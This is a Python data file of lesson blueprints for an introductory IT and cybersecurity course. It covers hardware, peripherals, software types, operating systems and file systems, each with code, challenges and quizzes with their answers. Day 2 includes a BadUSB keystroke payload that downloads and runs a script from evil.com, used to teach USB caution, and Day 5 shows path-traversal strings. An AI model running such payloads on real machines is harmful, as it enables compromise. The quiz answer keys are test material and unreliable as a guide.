"""
Cybersecurity & IT Fundamentals Curriculum - Days 1 to 20
Module 1: IT Fundamentals (Hardware & Systems) (Days 1-7)
Module 2: Networking Fundamentals (Days 8-13)
Module 3: Cyber Security Foundations (Days 14-19)
Module 4: Threats, Attacks & Malware (Part 1: Day 20)

Universal Standard Compliant:
- ELI5 markdown theory with beginner analogies
- Shell / Python / configuration snippets
- Daily hands-on coding or practical challenge
- Exactly 5 MCQs per day (100 total for Days 1-20)
"""

from seeder.course_blueprint import DayBlueprint

DAYS_1_TO_20 = [
    # ---------------------------------------------------------
    # Day 1: Introduction to Computing (CPU, RAM, Storage, Motherboards)
    # ---------------------------------------------------------
    DayBlueprint(
        order=1,
        title="Day 1: Introduction to Computing (CPU, RAM, Storage, Motherboards)",
        concept="Understanding the physical hardware anatomy of modern computers—CPU as the brain, RAM as the working desk, storage as the permanent filing cabinet, and the motherboard as the central nervous system.",
        analogy="Think of a computer as an executive chef in a restaurant: The CPU is the chef chopping and cooking. The RAM is the kitchen prep table where active ingredients sit within arm's reach. Storage (SSD/HDD) is the walk-in pantry freezer downstairs. The motherboard is the kitchen floor and wiring connecting everyone together.",
        theory_sections=[
            {
                "heading": "The Anatomy of a Computer System",
                "content": (
                    "Every computational device, from supercomputers to smartphones, relies on four primary hardware components:\n\n"
                    "1. **CPU (Central Processing Unit)**: The computational engine executing the fetch-decode-execute cycle billions of times per second (GHz clock speed). Multi-core architectures allow simultaneous processing threads.\n"
                    "2. **RAM (Random Access Memory)**: Volatile, high-speed temporary memory. It holds currently executing operating system processes and open applications. When power is lost, RAM wipes completely clean.\n"
                    "3. **Storage (SSD vs HDD)**: Non-volatile, persistent storage. Hard Disk Drives (HDDs) use spinning magnetic platters (slow, mechanical). Solid-State Drives (SSDs) and NVMe use flash NAND cells (ultra-fast, zero moving parts).\n"
                    "4. **Motherboard (Mainboard)**: The printed circuit board (PCB) providing the electrical bus lines (PCIe, SATA, front panel) that interconnect the CPU, RAM, GPU, and peripheral chipsets."
                )
            },
            {
                "heading": "Why Hardware Understanding Matters for Cybersecurity",
                "content": (
                    "Security starts at the physical layer. Hardware vulnerabilities like **Spectre** and **Meltdown** exploited CPU speculative execution. Malware like bootkits hide in motherboard UEFI firmware chips before the OS even boots. Physical RAM can be imaged via 'Cold Boot Attacks' to recover unencrypted encryption keys."
                )
            }
        ],
        code_snippets=[
            {
                "title": "Inspecting System Hardware via Command Line (Windows PowerShell & Linux Bash)",
                "language": "bash",
                "code": (
                    "# Windows PowerShell Hardware Query:\n"
                    "Get-CimInstance Win32_Processor | Select-Object Name, NumberOfCores, MaxClockSpeed\n"
                    "Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum\n\n"
                    "# Linux Terminal Hardware Query:\n"
                    "lscpu | grep 'Model name\\|CPU(s):'\n"
                    "free -h  # Display total, used, and free RAM in human-readable gigabytes\n"
                    "lsblk    # List all block storage devices and partitions"
                ),
                "explanation": "Essential sysadmin and analyst commands to inspect CPU specifications, memory capacity, and physical storage drives."
            },
            {
                "title": "Python Script: Reading Hardware Metrics Programmatically",
                "language": "python",
                "code": (
                    "import psutil\n\n"
                    "def get_system_specs():\n"
                    "    cpu_count = psutil.cpu_count(logical=True)\n"
                    "    cpu_freq = psutil.cpu_freq().current\n"
                    "    ram_gb = psutil.virtual_memory().total / (1024 ** 3)\n"
                    "    disk_gb = psutil.disk_usage('/').total / (1024 ** 3)\n"
                    "    \n"
                    "    print(f'CPU Logical Cores: {cpu_count} @ {cpu_freq:.1f} MHz')\n"
                    "    print(f'Total RAM: {ram_gb:.2f} GB')\n"
                    "    print(f'Primary Storage: {disk_gb:.2f} GB')\n\n"
                    "if __name__ == '__main__':\n"
                    "    get_system_specs()"
                ),
                "explanation": "Uses the standard `psutil` library to audit hardware configurations in incident response automation."
            }
        ],
        coding_challenge={
            "description": "Write a Python function `classify_memory_tier(bytes_value: int) -> str` that converts raw byte capacities into human-readable strings (KB, MB, GB, TB) with two decimal places.",
            "starter_code": (
                "def classify_memory_tier(bytes_value: int) -> str:\n"
                "    # TODO: Convert bytes into KB, MB, GB, or TB dynamically\n"
                "    return ''\n\n"
                "# Test with 16 GB of RAM\n"
                "print(classify_memory_tier(17179869184))"
            ),
            "solution_code": (
                "def classify_memory_tier(bytes_value: int) -> str:\n"
                "    units = ['B', 'KB', 'MB', 'GB', 'TB', 'PB']\n"
                "    val = float(bytes_value)\n"
                "    for unit in units:\n"
                "        if val < 1024.0 or unit == 'PB':\n"
                "            return f'{val:.2f} {unit}'\n"
                "        val /= 1024.0\n"
                "    return f'{val:.2f} B'\n\n"
                "print(classify_memory_tier(17179869184))"
            ),
            "expected_output": "16.00 GB"
        },
        quizzes=[
            {
                "question": "Which computer component is classified as volatile memory, meaning its contents are lost upon power loss?",
                "options": ["RAM (Random Access Memory)", "Solid-State Drive (SSD)", "Hard Disk Drive (HDD)", "Motherboard ROM/UEFI Chip"],
                "correct_answer": "RAM (Random Access Memory)",
                "explanation": "RAM requires continuous electrical power to maintain bit state in its capacitors and transistors. When powered down, it clears immediately."
            },
            {
                "question": "What is the primary role of the CPU's clock speed (measured in Gigahertz / GHz)?",
                "options": [
                    "How many billions of machine instruction cycles the CPU can execute per second",
                    "How many gigabytes of data can fit on the hard drive",
                    "The maximum internet download speed allowed",
                    "The physical temperature of the computer case"
                ],
                "correct_answer": "How many billions of machine instruction cycles the CPU can execute per second",
                "explanation": "Clock speed indicates the frequency of the CPU's internal clock generator; 3.5 GHz means roughly 3.5 billion clock cycles per second."
            },
            {
                "question": "Why do modern computers use SSDs (Solid-State Drives) instead of traditional spinning HDDs for operating system drives?",
                "options": [
                    "SSDs use flash memory with zero moving mechanical parts, providing dramatically lower latency and faster read/write speeds",
                    "SSDs are immune to all computer viruses and malware",
                    "HDDs cannot connect to motherboards anymore",
                    "SSDs do not require any electricity"
                ],
                "correct_answer": "SSDs use flash memory with zero moving mechanical parts, providing dramatically lower latency and faster read/write speeds",
                "explanation": "SSDs store data electronically in NAND flash cells, eliminating mechanical seek times and spindle latencies found in traditional rotating magnetic platters."
            },
            {
                "question": "What is the primary function of the computer Motherboard?",
                "options": [
                    "To serve as the central backbone circuit board routing communication and electrical power between the CPU, RAM, storage, and expansion cards",
                    "To provide an internet Wi-Fi connection without a router",
                    "To compress files on the desktop",
                    "To act as the operating system kernel"
                ],
                "correct_answer": "To serve as the central backbone circuit board routing communication and electrical power between the CPU, RAM, storage, and expansion cards",
                "explanation": "The motherboard holds the CPU socket, RAM slots, PCIe lanes, power connectors, and chipset to allow high-speed synchronized communication."
            },
            {
                "question": "From a security standpoint, why are UEFI/BIOS chips on motherboards a prime target for advanced threat actors?",
                "options": [
                    "Malware installed in UEFI executes before the operating system and antivirus load, surviving standard hard drive wipes",
                    "UEFI chips store all unencrypted credit cards",
                    "UEFI chips automatically transmit data to public torrent sites",
                    "UEFI chips control the physical power outlet of the building"
                ],
                "correct_answer": "Malware installed in UEFI executes before the operating system and antivirus load, surviving standard hard drive wipes",
                "explanation": "Bootkits and firmware rootkits target UEFI firmware because code there runs with Ring -2 privileges, persisting across operating system reinstalls."
            }
        ]
    ),

    # ---------------------------------------------------------
    # Day 2: Input, Output, and Peripheral Devices
    # ---------------------------------------------------------
    DayBlueprint(
        order=2,
        title="Day 2: Input, Output, and Peripheral Devices",
        concept="Understanding how human users and external hardware interact with computers through input/output (I/O) interfaces, and analyzing the hardware attack vectors peripheral devices present.",
        analogy="Peripherals are like a building's delivery doors and intercoms. Input devices (keyboards, scanners) are visitors speaking into the intercom. Output devices (monitors, speakers) are announcement loudspeakers. But if a disguised intruder plugs in an unauthorized master key (BadUSB), the whole facility is breached.",
        theory_sections=[
            {
                "heading": "Input vs. Output Devices",
                "content": (
                    "Peripherals bridge the analog physical world and the digital CPU:\n\n"
                    "1. **Input Devices**: Convert physical user actions into binary electrical signals. Examples: Keyboards, mice, webcams, barcode scanners, fingerprint sensors, microphones.\n"
                    "2. **Output Devices**: Convert processed digital signals into human-perceptible representations. Examples: Monitors (pixels via HDMI/DisplayPort), printers, audio speakers, haptic motors.\n"
                    "3. **Hybrid (I/O) Devices**: Capable of bidirectional transmission. Examples: Touchscreens, external network cards (NICs), external hard drives, VR headsets."
                )
            },
            {
                "heading": "Cybersecurity Risks with Peripherals: The HID Attack",
                "content": (
                    "Computers inherently trust Human Interface Devices (HIDs) such as keyboards. Attackers leverage this implicit trust using rogue USB hardware (e.g., **Rubber Ducky**, **Bash Bunny**). When plugged into a target machine, the microcontroller registers as a legitimate USB keyboard and types out malicious PowerShell commands at 1,000 words per minute, bypassing endpoint antivirus filters."
                )
            }
        ],
        code_snippets=[
            {
                "title": "Simulating Keystroke Injection (DuckyScript Concept)",
                "language": "bash",
                "code": (
                    "# Rubber Ducky / BadUSB conceptual payload:\n"
                    "REM Open Windows Run Dialogue\n"
                    "GUI r\n"
                    "DELAY 500\n"
                    "REM Launch PowerShell with execution bypass and download payload\n"
                    "STRING powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"Invoke-WebRequest http://evil.com/payload.ps1 -OutFile $env:TEMP/p.ps1; Start-Process $env:TEMP/p.ps1\"\n"
                    "ENTER"
                ),
                "explanation": "Demonstrates why unplugged, found USB drives in parking lots must NEVER be inserted into corporate computers."
            },
            {
                "title": "Python: Auditing Connected USB Devices on Linux/macOS",
                "language": "python",
                "code": (
                    "import subprocess\n\n"
                    "def list_connected_usb():\n"
                    "    # Runs the lsusb command to inspect Vendor and Product IDs\n"
                    "    result = subprocess.run(['lsusb'], capture_output=True, text=True)\n"
                    "    print('Connected USB Devices:')\n"
                    "    for line in result.stdout.strip().split('\\n'):\n"
                    "        print(f'  [+] {line}')\n\n"
                    "if __name__ == '__main__':\n"
                    "    list_connected_usb()"
                ),
                "explanation": "Sysadmins and SOC analysts monitor USB device plug events to detect unauthorized hardware."
            }
        ],
        coding_challenge={
            "description": "Write a Python function `inspect_usb_whitelist(device_id: str, approved_ids: list) -> dict` that evaluates whether a newly connected USB peripheral is authorized or should be blocked as a rogue device.",
            "starter_code": (
                "def inspect_usb_whitelist(device_id: str, approved_ids: list) -> dict:\n"
                "    # Return a dict: {'device_id': device_id, 'status': 'ALLOWED' or 'BLOCKED'}\n"
                "    return {}\n\n"
                "approved = ['VID:046D_PID:C52B', 'VID:045E_PID:07A5']\n"
                "print(inspect_usb_whitelist('VID:1337_PID:BEEF', approved))"
            ),
            "solution_code": (
                "def inspect_usb_whitelist(device_id: str, approved_ids: list) -> dict:\n"
                "    is_allowed = device_id in approved_ids\n"
                "    return {\n"
                "        'device_id': device_id,\n"
                "        'status': 'ALLOWED' if is_allowed else 'BLOCKED'\n"
                "    }\n\n"
                "approved = ['VID:046D_PID:C52B', 'VID:045E_PID:07A5']\n"
                "print(inspect_usb_whitelist('VID:1337_PID:BEEF', approved))"
            ),
            "expected_output": "{'device_id': 'VID:1337_PID:BEEF', 'status': 'BLOCKED'}"
        },
        quizzes=[
            {
                "question": "Which of the following is strictly an INPUT device?",
                "options": ["Barcode scanner", "Computer monitor", "Laser printer", "Audio speaker"],
                "correct_answer": "Barcode scanner",
                "explanation": "A barcode scanner captures optical information and sends it as data into the computer system; it does not produce human-perceptible output."
            },
            {
                "question": "What is a 'BadUSB' or 'Rubber Ducky' attack?",
                "options": [
                    "A malicious USB device that poses as a standard keyboard to inject rapid keystrokes and execute unauthorized commands",
                    "A virus that physically melts the USB connector",
                    "An attack that steals electricity from the wall outlet",
                    "A spam email with a duck icon"
                ],
                "correct_answer": "A malicious USB device that poses as a standard keyboard to inject rapid keystrokes and execute unauthorized commands",
                "explanation": "Operating systems implicitly trust keyboards. BadUSB devices spoof HID descriptors and type malicious shell commands within seconds."
            },
            {
                "question": "Which device can act as both an input and an output device simultaneously?",
                "options": ["A capacitive touchscreen display", "A standard computer mouse", "A wired microphone", "A standalone flatbed document scanner"],
                "correct_answer": "A capacitive touchscreen display",
                "explanation": "A touchscreen displays visual output to the user while simultaneously registering capacitive touch input coordinates."
            },
            {
                "question": "What enterprise security policy mitigates the risk of rogue USB drives being plugged into company laptops?",
                "options": [
                    "USB port blocking and peripheral whitelisting via Group Policy or EDR software",
                    "Deleting all desktop shortcuts",
                    "Lowering monitor display brightness",
                    "Using stronger Wi-Fi passwords"
                ],
                "correct_answer": "USB port blocking and peripheral whitelisting via Group Policy or EDR software",
                "explanation": "Endpoint management agents can restrict USB storage mounts or only allow specific approved Vendor/Product IDs."
            },
            {
                "question": "What is a hardware keylogger?",
                "options": [
                    "A physical inline adapter placed between a keyboard and computer that records every keystroke directly to internal flash memory",
                    "A software tool that counts how many times the Spacebar is pressed",
                    "A digital certificate issued by a certificate authority",
                    "A mechanical lock for the server room door"
                ],
                "correct_answer": "A physical inline adapter placed between a keyboard and computer that records every keystroke directly to internal flash memory",
                "explanation": "Hardware keyloggers intercept raw electrical keystroke signals without needing any software installation on the host OS."
            }
        ]
    ),

    # ---------------------------------------------------------
    # Day 3: Types of Software (System Software vs Application Software)
    # ---------------------------------------------------------
    DayBlueprint(
        order=3,
        title="Day 3: Types of Software (System Software vs Application Software)",
        concept="Differentiating between low-level system software (operating systems, device drivers, firmware) and high-level application software (browsers, word processors, games), and their respective security attack surfaces.",
        analogy="Think of a theater: System software is the stage crew, lighting rig, electricity generators, and stage managers who make the building operate. Application software is the actors performing a specific play. If the stage crew (system software) is compromised, any play running on the stage collapses.",
        theory_sections=[
            {
                "heading": "The Hierarchy of Software",
                "content": (
                    "Software is divided into distinct operational tiers:\n\n"
                    "1. **Firmware**: Code embedded permanently in non-volatile ROM/flash memory chips on motherboards, hard drives, and network cards (e.g., BIOS/UEFI).\n"
                    "2. **System Software**: Manages hardware resources and provides a runtime platform for applications. Key elements include the Operating System Kernel, device drivers, and core utilities.\n"
                    "3. **Application Software**: Programs designed for end users to accomplish specific tasks: web browsers (Chrome), spreadsheets (Excel), databases (PostgreSQL), and IDEs (VS Code).\n"
                    "4. **Utility Software**: Maintenance and optimization tools: antivirus scanners, disk defragmenters, file archivers (7-Zip)."
                )
            },
            {
                "heading": "The Security Implication of Privilege Rings",
                "content": (
                    "Modern CPUs enforce **Protection Rings** (Ring 0 to Ring 3):\n"
                    "- **Ring 0 (Kernel Mode)**: System software and device drivers execute here with full, unrestricted access to all CPU instructions, physical memory, and hardware.\n"
                    "- **Ring 3 (User Mode)**: Application software executes here with restricted privileges. A crash in Chrome cannot crash the CPU, and user apps cannot read other processes' memory without kernel system calls."
                )
            }
        ],
        code_snippets=[
            {
                "title": "Verifying Running System vs User Services (PowerShell & Linux)",
                "language": "bash",
                "code": (
                    "# Windows: Inspecting kernel drivers vs user processes:\n"
                    "driverquery /FO table\n"
                    "Get-Process | Where-Object {$_.SessionId -eq 0} # Session 0: System services\n\n"
                    "# Linux: Viewing PID 1 (Init system) and system daemons:\n"
                    "ps -ef | grep systemd\n"
                    "lsmod  # List loaded kernel modules (device drivers)"
                ),
                "explanation": "Demonstrates how system software runs under distinct system contexts compared to user application processes."
            },
            {
                "title": "Python: Classifying Software by Process Executable Path",
                "language": "python",
                "code": (
                    "import psutil\n\n"
                    "def classify_process(name: str) -> str:\n"
                    "    system_names = {'kernel32', 'systemd', 'svchost.exe', 'lsass.exe', 'init'}\n"
                    "    if name.lower() in system_names:\n"
                    "        return 'System Software / Core Daemon'\n"
                    "    return 'Application Software / User Process'\n\n"
                    "print(classify_process('svchost.exe'))\n"
                    "print(classify_process('chrome.exe'))"
                ),
                "explanation": "Simple process auditor distinguishing essential OS daemons from end-user productivity applications."
            }
        ],
        coding_challenge={
            "description": "Write a Python function `filter_untrusted_apps(processes: list, approved_hashes: set) -> list` that scans a list of running process dicts `{'name': str, 'sha256': str}` and returns only the unapproved application processes.",
            "starter_code": (
                "def filter_untrusted_apps(processes: list, approved_hashes: set) -> list:\n"
                "    # Return list of process names that are not in approved_hashes\n"
                "    return []\n\n"
                "apps = [\n"
                "    {'name': 'chrome.exe', 'sha256': 'abc123hash'},\n"
                "    {'name': 'crypto_miner.exe', 'sha256': 'bad456hash'}\n"
                "]\n"
                "approved = {'abc123hash'}\n"
                "print(filter_untrusted_apps(apps, approved))"
            ),
            "solution_code": (
                "def filter_untrusted_apps(processes: list, approved_hashes: set) -> list:\n"
                "    untrusted = []\n"
                "    for proc in processes:\n"
                "        if proc.get('sha256') not in approved_hashes:\n"
                "            untrusted.append(proc.get('name'))\n"
                "    return untrusted\n\n"
                "apps = [\n"
                "    {'name': 'chrome.exe', 'sha256': 'abc123hash'},\n"
                "    {'name': 'crypto_miner.exe', 'sha256': 'bad456hash'}\n"
                "]\n"
                "approved = {'abc123hash'}\n"
                "print(filter_untrusted_apps(apps, approved))"
            ),
            "expected_output": "['crypto_miner.exe']"
        },
        quizzes=[
            {
                "question": "Which of the following is classified as System Software rather than Application Software?",
                "options": ["A hardware device driver", "Microsoft Excel", "Google Chrome", "Adobe Photoshop"],
                "correct_answer": "A hardware device driver",
                "explanation": "Device drivers communicate directly with hardware controllers and the operating system kernel, making them system software."
            },
            {
                "question": "In modern CPU architecture, what distinction exists between Ring 0 (Kernel Mode) and Ring 3 (User Mode)?",
                "options": [
                    "Ring 0 has complete, unrestricted access to physical hardware instructions, while Ring 3 restricts user applications to prevent system crashes",
                    "Ring 3 runs ten times faster than Ring 0",
                    "Ring 0 is reserved only for video games",
                    "Ring 3 is where the motherboard BIOS is stored"
                ],
                "correct_answer": "Ring 0 has complete, unrestricted access to physical hardware instructions, while Ring 3 restricts user applications to prevent system crashes",
                "explanation": "Protection rings isolate untrusted user software (Ring 3) from low-level OS memory and hardware controls (Ring 0)."
            },
            {
                "question": "Why is a vulnerability in a kernel-level device driver significantly more severe than a vulnerability in a desktop web app?",
                "options": [
                    "Kernel-level exploits give attackers total control over the entire operating system, bypassing all user-level security boundaries",
                    "Kernel drivers cannot be backed up to the cloud",
                    "Kernel drivers use more electricity",
                    "Device drivers are written in HTML"
                ],
                "correct_answer": "Kernel-level exploits give attackers total control over the entire operating system, bypassing all user-level security boundaries",
                "explanation": "Kernel mode code operates with the highest privileges. A compromise in Ring 0 allows an attacker to disable EDR, modify memory, and intercept all data."
            },
            {
                "question": "What is Firmware?",
                "options": [
                    "Low-level software permanently or semi-permanently written into a read-only memory chip to control hardware devices",
                    "An expired antivirus trial",
                    "A physical case protecting a laptop screen",
                    "A spreadsheet containing employee names"
                ],
                "correct_answer": "Low-level software permanently or semi-permanently written into a read-only memory chip to control hardware devices",
                "explanation": "Firmware provides fundamental operational instructions directly to device hardware chips (e.g., router firmware, UEFI, SSD controllers)."
            },
            {
                "question": "What is the primary role of Utility Software?",
                "options": [
                    "To maintain, diagnose, optimize, and protect the computer system (e.g., disk cleanups, antivirus, backup tools)",
                    "To compose musical symphonies",
                    "To manufacture silicon computer chips",
                    "To design graphical logos"
                ],
                "correct_answer": "To maintain, diagnose, optimize, and protect the computer system (e.g., disk cleanups, antivirus, backup tools)",
                "explanation": "Utility software supports the computer infrastructure by optimizing performance, automating backups, and scanning for malware."
            }
        ]
    ),

    # ---------------------------------------------------------
    # Day 4: Operating Systems Basics (Windows, Linux, macOS)
    # ---------------------------------------------------------
    DayBlueprint(
        order=4,
        title="Day 4: Operating Systems Basics (Windows, Linux, macOS)",
        concept="Understanding the architecture of modern operating systems, core components (Kernel, Shell, File System, Process Manager), and security architecture across Windows, Linux, and macOS.",
        analogy="An Operating System is like the government of a bustling city. The Kernel is the city council and police keeping order behind closed doors. The Shell (GUI/CLI) is the public city hall reception desk where citizens submit requests. Processes are businesses operating in assigned buildings under city zoning laws.",
        theory_sections=[
            {
                "heading": "Core Operating System Functions",
                "content": (
                    "The Operating System (OS) is the essential master control program:\n\n"
                    "1. **Kernel**: The heart of the OS. Manages CPU scheduling, memory allocation, and hardware interrupts.\n"
                    "2. **Process Management**: Ensures each application runs in its own isolated memory address space without crashing neighbors.\n"
                    "3. **File System Management**: Organizes files into hierarchical directories on block storage.\n"
                    "4. **User Interface / Shell**: Graphical User Interface (GUI) or Command Line Interface (CLI) translating user commands into kernel system calls."
                )
            },
            {
                "heading": "Windows vs Linux vs macOS from a Security Perspective",
                "content": (
                    "- **Windows**: Dominated corporate desktops. Features Active Directory integration, User Account Control (UAC), and Windows Defender. Most frequently targeted by commodity malware due to market share.\n"
                    "- **Linux**: Powers >90% of the world's cloud servers, supercomputers, and Android. Built with a strict multi-user permission model (`root` vs unprivileged users), modular open-source code, and SELinux/AppArmor mandatory access controls.\n"
                    "- **macOS**: Built on a Unix foundation (Darwin/BSD). Incorporates hardware-backed security (T2/Apple Silicon Secure Enclave), Gatekeeper code signing, and System Integrity Protection (SIP)."
                )
            }
        ],
        code_snippets=[
            {
                "title": "Basic Shell Comparison: Windows PowerShell vs Linux/macOS Bash",
                "language": "bash",
                "code": (
                    "# Windows PowerShell:\n"
                    "whoami                  # Current logged-in user\n"
                    "Get-Service | Where-Object {$_.Status -eq 'Running'}\n"
                    "ipconfig /all           # Network interfaces\n\n"
                    "# Linux / macOS Bash:\n"
                    "whoami                  # Current logged-in user\n"
                    "systemctl list-units --type=service --state=running\n"
                    "ip a                    # Network interfaces (Linux) or 'ifconfig'"
                ),
                "explanation": "Every cybersecurity practitioner must be bilingual in both Windows command structures and Linux/Unix terminal syntax."
            },
            {
                "title": "Python: Cross-Platform OS Detection Script",
                "language": "python",
                "code": (
                    "import platform\n"
                    "import os\n\n"
                    "def audit_os_environment():\n"
                    "    os_type = platform.system()\n"
                    "    release = platform.release()\n"
                    "    arch = platform.machine()\n"
                    "    print(f'Detected OS: {os_type} (Version: {release}) on {arch}')\n"
                    "    \n"
                    "    if os_type == 'Windows':\n"
                    "        print('Admin Status: ', bool(os.environ.get('SESSIONNAME')))\n"
                    "    else:\n"
                    "        print('Is Root: ', os.geteuid() == 0)\n\n"
                    "if __name__ == '__main__':\n"
                    "    audit_os_environment()"
                ),
                "explanation": "Security tools dynamically detect the underlying OS to select appropriate forensic auditing commands."
            }
        ],
        coding_challenge={
            "description": "Write a Python function `check_privilege_level(uid: int, username: str) -> str` that returns 'SUPERUSER' if the UID is 0 or username is 'Administrator'/'root', otherwise returns 'STANDARD_USER'.",
            "starter_code": (
                "def check_privilege_level(uid: int, username: str) -> str:\n"
                "    # Return 'SUPERUSER' or 'STANDARD_USER'\n"
                "    return ''\n\n"
                "print(check_privilege_level(0, 'root'))\n"
                "print(check_privilege_level(1001, 'john_doe'))"
            ),
            "solution_code": (
                "def check_privilege_level(uid: int, username: str) -> str:\n"
                "    if uid == 0 or username.lower() in ['root', 'administrator']:\n"
                "        return 'SUPERUSER'\n"
                "    return 'STANDARD_USER'\n\n"
                "print(check_privilege_level(0, 'root'))\n"
                "print(check_privilege_level(1001, 'john_doe'))"
            ),
            "expected_output": "SUPERUSER\nSTANDARD_USER"
        },
        quizzes=[
            {
                "question": "What is the primary role of the Operating System Kernel?",
                "options": [
                    "To act as the core interface between software processes and physical hardware, managing memory, CPU scheduling, and devices",
                    "To serve as the desktop wallpaper manager",
                    "To encrypt all emails sent over the internet",
                    "To design web pages automatically"
                ],
                "correct_answer": "To act as the core interface between software processes and physical hardware, managing memory, CPU scheduling, and devices",
                "explanation": "The kernel is the lowest-level program of the OS, maintaining absolute oversight over all memory access, CPU cycles, and peripheral I/O."
            },
            {
                "question": "In Linux operating systems, what is the default User ID (UID) of the all-powerful `root` administrative account?",
                "options": ["UID 0", "UID 1", "UID 1000", "UID 9999"],
                "correct_answer": "UID 0",
                "explanation": "In Unix and Linux systems, the root user always holds UID 0, granting unrestricted permissions across the entire operating system."
            },
            {
                "question": "What is the purpose of Windows User Account Control (UAC)?",
                "options": [
                    "To prompt users for elevation consent before an application runs with full administrative privileges, preventing silent software installs",
                    "To charge a monthly subscription for Windows updates",
                    "To automatically delete old files from the recycle bin",
                    "To control the volume of audio speakers"
                ],
                "correct_answer": "To prompt users for elevation consent before an application runs with full administrative privileges, preventing silent software installs",
                "explanation": "UAC ensures that software runs in standard user context unless explicit elevation consent or admin credentials are provided."
            },
            {
                "question": "Which operating system family dominates public cloud server infrastructure and internet backbone routing?",
                "options": ["Linux", "Windows 95", "MS-DOS", "macOS Classic"],
                "correct_answer": "Linux",
                "explanation": "Linux powers over 90% of the world's web servers, container clusters (Docker/Kubernetes), and cloud instances due to its stability and performance."
            },
            {
                "question": "What is a 'Shell' in an operating system?",
                "options": [
                    "A command-line or graphical environment that takes user inputs and translates them into kernel system calls",
                    "The plastic outer casing of the computer monitor",
                    "A type of virus that hides inside a Word document",
                    "The CPU cooling fan"
                ],
                "correct_answer": "A command-line or graphical environment that takes user inputs and translates them into kernel system calls",
                "explanation": "The shell surrounds the kernel (like an outer shell), serving as the user interface (e.g., bash, zsh, PowerShell)."
            }
        ]
    ),

    # ---------------------------------------------------------
    # Day 5: File Systems & Directory Structures
    # ---------------------------------------------------------
    DayBlueprint(
        order=5,
        title="Day 5: File Systems & Directory Structures",
        concept="Understanding how data is organized, tracked, and permissioned on physical media using file systems (NTFS, FAT32, ext4, APFS), and mastering directory traversal and access control lists (ACLs).",
        analogy="A raw hard drive is like an empty library building with zero shelves. A file system is the librarian who installs labeled bookcases, builds an index catalog (file allocation table/inodes), and stamps checkout permission cards on each book.",
        theory_sections=[
            {
                "heading": "Common File Systems and Their Attributes",
                "content": (
                    "A file system determines how bits are indexed and retrieved from storage:\n\n"
                    "1. **NTFS (New Technology File System)**: The standard Windows file system. Supports file-level encryption (EFS), compression, journaling for crash recovery, and granular Access Control Lists (ACLs).\n"
                    "2. **ext4 (Fourth Extended Filesystem)**: The default for modern Linux distributions. Uses **inodes** to store file metadata (permissions, timestamps, block pointers) separately from filenames.\n"
                    "3. **FAT32 & exFAT**: Universal compatibility for flash drives. FAT32 has a strict 4 GB maximum file size limitation and lacks permissions or journaling. exFAT removes the 4 GB limit.\n"
                    "4. **APFS (Apple File System)**: Optimized for flash/SSD storage on macOS/iOS, featuring atomic safe-saves, encryption, and instant file cloning."
                )
            },
            {
                "heading": "Directory Structures & Path Traversal Risks",
                "content": (
                    "Windows utilizes drive letters (`C:\\Windows\\System32`), whereas Linux/Unix utilizes a single unified hierarchical tree starting at root (`/`):\n"
                    "- `/etc`: System configuration files (e.g., `/etc/passwd`, `/etc/shadow`).\n"
                    "- `/var/log`: System and application event audit logs.\n"
                    "- Path Traversal (`../..`): A critical web vulnerability where attackers supply dot-dot-slash characters to escape web roots and read sensitive files like `/etc/shadow` or `C:\\Windows\\win.ini`."
                )
            }
        ],
        code_snippets=[
            {
                "title": "Inspecting File Permissions (Linux `ls -l` vs Windows `icacls`)",
                "language": "bash",
                "code": (
                    "# Linux permissions: User, Group, Others (rwx):\n"
                    "ls -la /etc/shadow\n"
                    "# Output: -rw-r----- 1 root shadow 1240 Jan 15 10:00 /etc/shadow\n"
                    "chmod 600 secret.txt    # Set read/write for owner only\n\n"
                    "# Windows Access Control Lists (ACLs):\n"
                    "icacls \"C:\\confidential\" /grant \"Sales_Group:(OI)(CI)F\""
                ),
                "explanation": "Understanding permission strings is foundational for auditing privilege escalation and unauthorized file access."
            },
            {
                "title": "Python: Detecting Path Traversal Attempts",
                "language": "python",
                "code": (
                    "import os\n\n"
                    "def secure_file_fetch(base_dir: str, requested_filename: str):\n"
                    "    # Resolve canonical absolute paths\n"
                    "    safe_base = os.path.abspath(base_dir)\n"
                    "    target_path = os.path.abspath(os.path.join(safe_base, requested_filename))\n"
                    "    \n"
                    "    # Verify the target remains strictly inside the safe directory tree\n"
                    "    if not target_path.startswith(safe_base):\n"
                    "        raise PermissionError(f'Path traversal blocked: {requested_filename}')\n"
                    "    return target_path\n\n"
                    "print(secure_file_fetch('/var/www/uploads', 'avatar.png'))\n"
                    "# secure_file_fetch('/var/www/uploads', '../../etc/passwd') -> Raises Error"
                ),
                "explanation": "Defensive code pattern preventing attackers from escaping approved directories."
            }
        ],
        coding_challenge={
            "description": "Write a Python function `parse_linux_permissions(octal_str: str) -> str` that converts a 3-digit octal permission (e.g., '754') into its standard symbolic notation (e.g., 'rwxr-xr--').",
            "starter_code": (
                "def parse_linux_permissions(octal_str: str) -> str:\n"
                "    # Convert 3-digit octal string like '755' to 'rwxr-xr-x'\n"
                "    return ''\n\n"
                "print(parse_linux_permissions('755'))\n"
                "print(parse_linux_permissions('600'))"
            ),
            "solution_code": (
                "def parse_linux_permissions(octal_str: str) -> str:\n"
                "    mapping = {\n"
                "        '0': '---', '1': '--x', '2': '-w-', '3': '-wx',\n"
                "        '4': 'r--', '5': 'r-x', '6': 'rw-', '7': 'rwx'\n"
                "    }\n"
                "    return ''.join(mapping.get(digit, '---') for digit in octal_str)\n\n"
                "print(parse_linux_permissions('755'))\n"
                "print(parse_linux_permissions('600'))"
            ),
            "expected_output": "rwxr-xr-x\nrw-------"
        },
        quizzes=[
            {
                "question": "What is the primary role of a 'Journaling' file system (such as NTFS or ext4)?",
                "options": [
                    "It logs pending file changes in a dedicated journal before committing them to disk, preventing data corruption during unexpected power outages",
                    "It sends a daily diary email of user activities to the manager",
                    "It deletes temporary files every Sunday evening",
                    "It translates file names into foreign languages"
                ],
                "correct_answer": "It logs pending file changes in a dedicated journal before committing them to disk, preventing data corruption during unexpected power outages",
                "explanation": "Journaling maintains an atomic transaction log of changes. If the machine crashes mid-write, the file system recovers cleanly upon reboot."
            },
            {
                "question": "What is the maximum individual file size supported by the older FAT32 file system?",
                "options": ["4 Gigabytes (GB)", "2 Terabytes (TB)", "512 Megabytes (MB)", "Unlimited"],
                "correct_answer": "4 Gigabytes (GB)",
                "explanation": "FAT32 uses 32-bit fields to track file byte lengths, limiting any single file to (2^32 - 1) bytes, which equals 4 GB minus 1 byte."
            },
            {
                "question": "What is an `inode` in a Linux file system?",
                "options": [
